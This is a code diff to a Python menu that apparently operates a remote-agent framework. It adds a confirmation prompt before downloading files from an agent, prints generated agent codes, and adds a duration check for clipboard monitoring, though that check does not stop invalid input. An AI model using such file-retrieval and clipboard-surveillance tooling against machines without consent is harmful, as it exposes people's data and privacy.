@@ -55,6 +55,7 @@ def generate_code_for_agent():
     ip_address = input('>')
     code = cybServerGateway.generate_first_code_for_agent(cybServerGateway.GenerateFirstCodeForAgentInputType(
         ip_address=ip_address))
+    print(code)
     menu()
 
 
@@ -63,8 +64,15 @@ def download_file_from_agent():
     ip_address = input('>')
     console.print("Insert agent's file path", style="info")
     file_path = input('>')
-    cybServerGateway.download_file_from_agent(cybServerGateway.DownloadFileFromAgentInputType(
-        ip_address=ip_address, file_path=file_path))
+
+    console.print(f"You are about to schedule task for downloading file {file_path} on agent {ip_address}. Proceed?(y/n)")
+
+    proc = input('>')
+
+    if proc == 'y':
+        cybServerGateway.download_file_from_agent(cybServerGateway.DownloadFileFromAgentInputType(
+            ip_address=ip_address, file_path=file_path))
+
     menu()
 
 
@@ -83,6 +91,12 @@ def monitor_agent_clipboard():
     ip_address = input('>')
     console.print("Insert agent's clipboard monitor duration", style="info")
     duration = input('>')
+
+    try:
+        integer = int(duration)
+    except ValueError:
+        console.print('The provided value is not an integer', style="error")
+
     cybServerGateway.monitor_clipboard_on_agent(cybServerGateway.MonitorClipboardOnAgentInputType(
         ip_address=ip_address, duration=duration))
     menu()
